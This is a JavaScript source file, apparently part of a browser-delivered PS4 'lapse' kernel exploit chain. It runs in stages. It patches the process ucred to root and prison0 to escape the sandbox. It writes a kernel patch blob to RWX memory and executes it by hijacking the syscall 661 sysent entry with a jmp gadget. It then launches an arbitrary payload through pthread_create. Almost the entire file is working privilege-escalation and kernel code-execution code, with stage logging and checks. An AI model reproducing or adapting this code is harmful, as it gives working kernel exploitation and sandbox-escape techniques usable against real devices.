async function walkToKernelProc(start) {
    let q = start, steps = 0;
    while (steps < 4096) {
        if (!q || !isKernelPtr(q)) return null;
        const procPid = kernelRead8(q.add32(PROC_PID));
        if ((procPid.low >>> 0) === 0 && (procPid.hi >>> 0) === 0) return q;
        q = kernelRead8(q.add32(P_LIST_NEXT));
        steps++;
        if ((steps & 0x1f) === 0) await forceYield();
    }
    return null;
}

async function stageCredentials() {
    state("stage 5: jailbreak...", "warn");

    curproc = kernelArwCurproc;
    if (!check("curproc-available-for-jailbreak",
        !!curproc && isKernelPtr(curproc), "" + curproc)) return false;

    kProc = await walkToKernelProc(curproc);
    mark("KPROC", "" + (kProc || "null"));
    if (!check("kproc-reached-by-walking-p_list_next",
        !!kProc && isKernelPtr(kProc), "" + (kProc || "null"))) return false;

    procFd = kernelRead8(curproc.add32(P_FD));
    ucred = kernelRead8(curproc.add32(P_UCRED));
    const kUcred = kernelRead8(kProc.add32(P_UCRED));
    const kFd = kernelRead8(kProc.add32(P_FD));
    /* These four get DEREFERENCED below, so demand the aligned test, not
       just the isKernelPtr range test. A misaligned "kernel" pointer
       passes isKernelPtr and then walks into unrelated kernel memory. */
    if (!check("credential-sources-are-kernel-pointers",
        isKernelPtrAligned(procFd) && isKernelPtrAligned(ucred)
        && isKernelPtrAligned(kUcred) && isKernelPtrAligned(kFd),
        `p_fd=${procFd} p_ucred=${ucred}`)) return false;

    const prison0 = kernelRead8(kUcred.add32(CR_PRISON));
    const rootvnode = kernelRead8(kFd.add32(FD_RDIR));
    mark("JAILBREAK-SOURCES", `prison0=${prison0} rootvnode=${rootvnode}`);
    if (!check("prison0-and-rootvnode-are-kernel-pointers",
        isKernelPtr(prison0) && isKernelPtr(rootvnode),
        `prison0=${prison0} rootvnode=${rootvnode}`)) return false;

    const uidBefore = sc(SYS.getuid).i32;
    const sandboxBefore = sc(SYS.is_in_sandbox).i32;
    mark("PRE-JAILBREAK", `uid=${uidBefore} sandbox=${sandboxBefore}`);

    // ---- patch the credentials ----
    const w32 = (a, v) => kernelWriteBuffer(a, [v & 0xff, (v >>> 8) & 0xff,
        (v >>> 16) & 0xff, (v >>> 24) & 0xff]);
    const w64 = (a, v) => kernelWrite8(a, v);

    w32(ucred.add32(CR_UID), 0);
    w32(ucred.add32(CR_RUID), 0);
    w32(ucred.add32(CR_SVUID), 0);
    w32(ucred.add32(CR_NGROUPS), 1);
    w32(ucred.add32(CR_RGID), 0);
    w64(ucred.add32(CR_PRISON), prison0);
    w64(ucred.add32(CR_SCECAPS1), new int64(-1, -1));
    w64(ucred.add32(CR_SCECAPS0), new int64(-1, -1));
    w64(procFd.add32(FD_RDIR), rootvnode);
    w64(procFd.add32(FD_JDIR), rootvnode);

    const backUid = kernelReadBuffer(ucred.add32(CR_UID), 4);
    const backPrison = kernelRead8(ucred.add32(CR_PRISON));
    const backRdir = kernelRead8(procFd.add32(FD_RDIR));
    mark("POST-JAILBREAK", "cr_uid=" + (backUid[0] | (backUid[1] << 8)
        | (backUid[2] << 16) | (backUid[3] << 24))
        + ` cr_prison=${backPrison} fd_rdir=${backRdir}`);
    check("ucred-reads-patched",
        backPrison.low === prison0.low && backPrison.hi === prison0.hi
        && backRdir.low === rootvnode.low && backRdir.hi === rootvnode.hi, "");

    const uidNow = sc(SYS.getuid).i32;
    const sandboxNow = sc(SYS.is_in_sandbox).i32;
    mark("POST-JAILBREAK-RUNTIME", `uid=${uidNow} sandbox=${sandboxNow}`);
    jailbroken = (sandboxNow === 0);
    check("kernel-reports-root-and-unsandboxed", jailbroken,
        `uid=${uidNow} sandbox=${sandboxNow}`);
    return jailbroken;
}

async function stagePatch() {
    if (!jailbroken) {
        mark("KPATCH-SKIPPED", "not jailbroken");
        return false;
    }
    state("stage 6: kernel patches...", "warn");

    const kpatchName = kpatchPath(key, off);
    /* kpatch was fetched in stagePrimitive, before the primitive, exactly
       as netctrl fetches its blobs. Reuse it; do not re-fetch. */
    if (!kpatch) {
        mark("KPATCH-SKIPPED", `blob ${kpatchName} missing`);
        return false;
    }
    const sites = kpatchJmpSites(kpatch);
    mark("KPATCH-BLOB", kpatchName + ` bytes=${kpatch.length}`
        + ` sites=${sites.length}`);
    if (!check("kpatch-blob-has-jump-sites", sites.length >= 4,
        sites.length + " sites")) return false;

    const offSysent = off.k_sysent_661 !== undefined
        ? off.k_sysent_661 : 0x1109350;
    const offGadget = off.k_jmp_rsi !== undefined
        ? off.k_jmp_rsi : 0x71a21;
    const kernelBase = kernelArwBase;
    const sysent = kernelBase.add32(offSysent);
    const gadget = kernelBase.add32(offGadget);

    const gb = kernelReadBuffer(gadget, 4);
    mark("JMP-RSI-BYTES", `${hx(gb[0])} ${hx(gb[1])} ${hx(gb[2])} ${hx(gb[3])}`);
    const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;

    const io = {
        kread32: a => { const b = kernelReadBuffer(a, 4); return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0; },
        kread64: a => kernelRead8(a),
        kwrite32: (a, v) => kernelWriteBuffer(a, [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]),
        kwrite64: (a, v) => kernelWrite8(a, v),
    };
    const saved = readSysentEntry(sysent, io);
    mark("SYSENT-661", "narg=" + saved.narg + " thrcnt=" + saved.thrcnt
        + " sy_call=" + saved.call);
    const sysentOk = saved.narg >= 0 && saved.narg <= 8
        && isKernelPtr(saved.call);

    let sitesOk = true;
    for (const s of sites) {
        const b = readByte(io, kernelBase.add32(s));
        if (!isGateableJumpByte(b)) sitesOk = false;
    }
    check("gadget-sysent661-patch-sites-look-right",
        gadgetOk && sysentOk && sitesOk,
        `gadget=${gadgetOk} sysent=${sysentOk} sites=${sitesOk}`);
    if (!(gadgetOk && sysentOk && sitesOk)) return false;

    const KEXEC_MAP = new int64(KEXEC_MAP_LO, KEXEC_MAP_HI);
    const m = mapRwxAtFixedAddress(sc, SYS, 0x4000, KEXEC_MAP);
    const mapAddr = new int64(m.lo, m.hi);
    mark("KPATCH-MAP", `jitshm_create=${m.fd} mmap=${mapAddr}`);
    if (!check("kpatch-rwx-map-valid", mapAddr.hi > 0, "" + mapAddr)) return false;

    /* Copy with lapse's OWN kernel writer, then verify EVERY byte.

       post-exploit.js's copyBlobToKernel() is netctrl-specific: it writes
       via p.write8, which only reaches kernel memory there because
       netctrl's ARW retargets the carrier at the kernel. In lapse the
       carrier stays a userland view and all kernel writes go through
       kernelWrite8/kernelWriteBuffer (the pktopts/PKTINFO window), so
       p.write8(mapAddr, ...) would write a KERNEL address through the
       userland carrier. */
    kernelWriteBuffer(mapAddr, kpatch);
    let kpOk = true;
    for (let o = 0; o < kpatch.length; o += 0x100) {
        const n = Math.min(0x100, kpatch.length - o);
        const got = kernelReadBuffer(mapAddr.add32(o), n);
        for (let i = 0; i < n; ++i) {
            if (got[i] !== kpatch[o + i]) {
                kpOk = false;
                mark("KPATCH-MISMATCH", `at=+0x${(o + i).toString(16)}`
                    + ` want=0x${kpatch[o + i].toString(16)}`
                    + ` got=0x${got[i].toString(16)}`);
                break;
            }
        }
        if (!kpOk) break;
    }
    check("kpatch-blob-copied-to-rwx", kpOk, kpatch.length + " bytes");
    if (!kpOk) return false;

    armSysentEntry(sysent, io, gadget);
    const armed = sameI64(readSysentEntry(sysent, io).call, gadget);
    mark("SYSENT-ARMED", "sy_call=" + gadget + (armed ? "" : " MISMATCH"));
    if (!armed) {
        writeSysentEntry(sysent, io, saved);
        return false;
    }

    let rc = -1;
    try {
        rc = sc(SYS.kexec, mapAddr).i32;
    } finally {
        writeSysentEntry(sysent, io, saved);
        const restored = sameI64(readSysentEntry(sysent, io).call, saved.call);
        if (!restored) mark("SYSENT-NOT-RESTORED",
            "syscall 661 still armed system-wide");
    }
    let allEb = true;
    for (const s of sites)
        if (readByte(io, kernelBase.add32(s)) !== 0xeb) allEb = false;
    mark("KEXEC", `arg=${mapAddr} rc=${rc} sites_eb=${allEb}`);
    kpatched = (rc === 0) && allEb;
    check("kernel-patch-ran-and-sites-are-0xeb", kpatched, "rc=" + rc);
    return kpatched;
}

async function stagePayload() {
    if (!(kpatched || params.get("payload") === "1")) {
        mark("PAYLOAD-SKIPPED", "kpatched=" + kpatched);
        return false;
    }
    if (params.get("payload") === "0") {
        mark("PAYLOAD-SKIPPED", "disabled by ?payload=0");
        return false;
    }
    state("stage 7: payload...", "warn");

    /* payload was fetched in stagePrimitive. Reuse it; do not re-fetch. */
    if (!payload) {
        mark("PAYLOAD-SKIPPED", "blob missing");
        return false;
    }
    const blob = payload;
    mark("PAYLOAD-BLOB", "bytes=" + blob.length);

    const sz = (blob.length + 0x3fff) & ~0x3fff;
    const am = mapAnonymousRwx(sc, SYS, sz, int64);
    const entry = am.entry;
    mark("PAYLOAD-MAP", `size=0x${sz.toString(16)} rwx=${entry}`);
    if (!check("payload-rwx-map-valid", entry.hi > 0, "" + entry)) return false;

    /* Same rule as the kpatch copy: lapse's own kernel writer, full
       byte-byte verification. See the KPATCH-MAP note above for why
       post-exploit.js's p-based copyBlobToKernel is netctrl-specific. */
    kernelWriteBuffer(entry, blob);
    let plOk = true;
    for (let o = 0; o < blob.length; o += 0x100) {
        const n = Math.min(0x100, blob.length - o);
        const got = kernelReadBuffer(entry.add32(o), n);
        for (let i = 0; i < n; ++i) {
            if (got[i] !== blob[o + i]) {
                plOk = false;
                mark("PAYLOAD-MISMATCH", `at=+0x${(o + i).toString(16)}`);
                break;
            }
        }
        if (!plOk) break;
    }
    check("payload-copied-to-rwx", plOk, blob.length + " bytes");
    if (!plOk) return false;

    const rr = resolvePthreadCreateShared({
        p: p, webkitBase: webkitBase, libkernelBase: libkernelBase,
        offsets: off, mark: mark,
    });
    /* Prefer the VALIDATED target. rr.cand is the raw GOT-slot guess and is
       only used when ?forcepthread=1 is set and nothing validated. Writing
       `rr.target || forced ? rr.cand : null` would invert this: || binds
       tighter than ?:, so a valid rr.target would select rr.cand --
       launching the payload at a speculative address. */
    let target = rr.target, how = rr.how;
    if (!target && params.get("forcepthread") === "1") {
        target = rr.cand;
        how = "forced";
        mark("PTHREAD-FORCED", "?forcepthread=1 -- calling " + rr.cand
            + " anyway (unvalidated)");
    }
    mark("PTHREAD-TARGET", target ? (how + " -> " + target) : "not resolved");
    if (!check("pthread-create-resolved", !!target,
        target ? "" + target : "no validated target")) return false;

    const launchAlloc = n => {
        const ab = new ArrayBuffer(n); keepAlive.push(ab);
        return { addr: bufAddr(ab), dv: new DataView(ab), u8: new Uint8Array(ab) };
    };
    const lt = launchThread((t, ...a) => callAddr(t, a), launchAlloc,
        int64, target, entry);
    mark("PTHREAD-CREATE", `rc=${lt.rc} handle=${lt.handle}`);
    payloadRan = lt.launched;
    check("payload-thread-created", payloadRan, "");
    if (payloadRan)
        mark("PAYLOAD-RUNNING", `bytes=${blob.length} entry=${entry}`);
    return payloadRan;
}

/* =====================================================================
 * TEARDOWN + REPORT -- always run, in netctrl's order.
 * ===================================================================== */
async function stageTeardown() {
    /* STOPPED AT THE PRIMITIVE. No worker was ever created and no thread
       was pinned, so the worker disarms, the wiring restore and the
       fd/socket cleanup have nothing to act on -- and lapseCleanup() would
       throw on its first alloc() because bufAddr is not installed yet.
       Undo the one thing that DOES exist, the expm1 gate stagePrimitive
       armed, then return. This is the fix for the live
       "CLEANUP-THREW  bufAddr is not a function". */
    if (stoppedEarly) {
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", (e && e.message) ? e.message : String(e)); }
        return;
    }
    /* Worker teardown FIRST: disarm every worker's expm1 gate and put the
       main thread's expm1 back before anything else, so no parked ROP
       chain can fire again while we are closing fds and releasing AIO
       entries underneath it. Matches netctrl's order (disarm + restore,
       then fd/socket cleanup). */
    try { await lapseTeardownWorkers("exit"); }
    catch (e) { mark("WORKER-TEARDOWN-THREW", (e && e.message) ? e.message : String(e)); }
    try { lapseCleanup("exit"); }
    catch (e) { mark("CLEANUP-THREW", (e && e.message) ? e.message : String(e)); }
}

function stageReport() {
    mark("PROOF-SUMMARY-FINAL", "pass=" + checkCounts().passCount
        + " fail=" + checkCounts().failCount);
}

// Main orchestrator: run the stages in order. Mirrors netctrl.js's shape.
async function runOriginal(options) {
    options = options || {};
    try {
        // Firmware, blobs, primitive, ROP gate. Two ways to fail, both reported.
        if (!(await stagePrimitive(options))) {
            /* Stop here. No workers, sockets or pipes exist yet, so the only
               thing the teardown has to undo is the expm1 gate stagePrimitive
               armed. stageTeardown checks stoppedEarly rather than running the
               full unwind. */
            stoppedEarly = true;
            if (primitiveFail === "already-jailbroken") {
                state("already jailbroken", "ok");
                return { success: false, alreadyJailbroken: true,
                    reason: "console is already jailbroken" };
            }
            return { success: false, reason: primitiveFail === "unsupported-firmware"
                ? "unsupported firmware"
                : "primitive did not come up -- see log" };
        }

        if (!(await stageRace()))
            return { success: false, reason: "aio race did not produce aliased rthdrs" };
        if (!(await stageLeak()))
            return { success: false, reason: "leak_kernel_addrs failed" };
        if (!(await stageArw()))
            return { success: false, reason: "make_kernel_arw failed" };
        if (!(await stageCredentials()))
            return { success: false, reason: "jailbreak failed" };
        await stagePatch();
        await stagePayload();

        mark("LAPSE-SUMMARY", "jailbroken=" + jailbroken
            + " kpatched=" + kpatched
            + " payload=" + payloadRan
            + " curproc=" + (curproc || "none")
            + " kproc=" + (kProc || "none")
            + " pass=" + checkCounts().passCount
            + " fail=" + checkCounts().failCount);
        state(payloadRan ? "ALL DONE" : jailbroken ? "JAILBROKEN -- no payload"
            : "FAILED -- see log", payloadRan ? "ok" : jailbroken ? "warn" : "bad");

        allDone = payloadRan;
        return { success: allDone, jailbroken: jailbroken };
    } catch (e) {
        mark("LAPSE-THREW", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
        return { success: false, reason: "threw: "
            + ((e && e.message) ? e.message : String(e)) };
    } finally {
        /* Runs on every exit path. Undoes stage 0 so the page is not left
           pinned at RT priority with blocked aio workers and ~112 open
           sockets -- that leftover state is what poisons the NEXT run's
           primitive groom. Skipped once the payload is up, because the
           kernel is ours at that point and the sockets must stay alive. */
        if (!payloadRan) {
            try { await stageTeardown(); }
            catch (e) { mark("TEARDOWN-THREW", (e && e.message) ? e.message : String(e)); }
        }
        stageReport();
    }
}
